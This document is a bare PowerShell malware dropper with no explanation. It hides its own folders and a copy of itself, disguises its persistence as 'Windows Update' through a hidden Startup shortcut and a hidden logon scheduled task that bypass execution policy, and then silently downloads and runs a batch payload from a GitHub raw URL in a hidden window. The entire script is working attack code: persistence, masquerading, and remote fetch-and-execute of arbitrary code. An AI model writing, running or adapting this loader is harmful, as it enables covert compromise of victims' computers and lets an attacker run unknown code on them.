# ===== Hidden Storage Setup =====
$hiddenStorage = "$env:APPDATA\Local\.syscache"
$hiddenTemp = "$env:TEMP\.appdata"

# Create/maintain hidden directories
@($hiddenStorage, $hiddenTemp) | ForEach-Object {
    if (-not (Test-Path $_)) {
        New-Item -Path $_ -ItemType Directory -Force | Out-Null
        attrib +h +s $_ | Out-Null
    }
    else {
        attrib +h +s $_ | Out-Null
    }
}

# ===== Self-Replication =====
$scriptCopy = "$hiddenStorage\winupdate.ps1"
if ((Test-Path $scriptCopy) -eq $false -or 
    (Get-FileHash $MyInvocation.MyCommand.Path).Hash -ne (Get-FileHash $scriptCopy).Hash) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptCopy -Force
    attrib +h +s $scriptCopy | Out-Null
}

# ===== Startup Folder Persistence =====
$startupLink = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update.lnk"
if (-not (Test-Path $startupLink)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($startupLink)
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-WindowStyle Hidden -Exec Bypass -File `"$scriptCopy`""
    $Shortcut.IconLocation = "shell32.dll,21"
    $Shortcut.Save()
    attrib +h $startupLink | Out-Null
}

# ===== Scheduled Task Persistence =====
$taskName = "Windows Update Service"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if (-not $taskExists) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptCopy`""
    
    $trigger = New-ScheduledTaskTrigger -AtLogon
    
    $principal = New-ScheduledTaskPrincipal `
        -UserId "$env:USERDOMAIN\$env:USERNAME" `
        -LogonType Interactive `
        -RunLevel Limited
        
    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -StartWhenAvailable
        
    $task = New-ScheduledTask `
        -Action $action `
        -Trigger $trigger `
        -Principal $principal `
        -Settings $settings
        
    Register-ScheduledTask -TaskName $taskName -InputObject $task | Out-Null
}

# ===== Payload Execution =====
Start-Sleep 35

$fileUrl = "https://github.com/anunnakigud1/hellosir/raw/refs/heads/main/oniway.bat"
$downloadPath = "$hiddenTemp\windows_update.bat"  # Correct extension

try {
    # Configure TLS for GitHub connection
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    # Silent download with retry logic
    $ProgressPreference = 'SilentlyContinue'
    $retryCount = 0
    $maxRetries = 3
    
    do {
        try {
            Invoke-WebRequest -Uri $fileUrl -OutFile $downloadPath -UseBasicParsing `
                -DisableKeepAlive -UserAgent "Mozilla/5.0" -ErrorAction Stop
            break
        }
        catch {
            $retryCount++
            if ($retryCount -ge $maxRetries) { throw }
            Start-Sleep -Seconds (10 * $retryCount)
        }
    } while ($true)

    attrib +h +s $downloadPath | Out-Null
    
    if (Test-Path $downloadPath) {
        # Execute batch file with hidden window
        $batchArgs = @(
            '/c', "call `"$downloadPath`"",
            '&&', 'exit'
        )
        Start-Process cmd.exe -WindowStyle Hidden -ArgumentList $batchArgs
    }
}
catch {
    # Silent error handling
}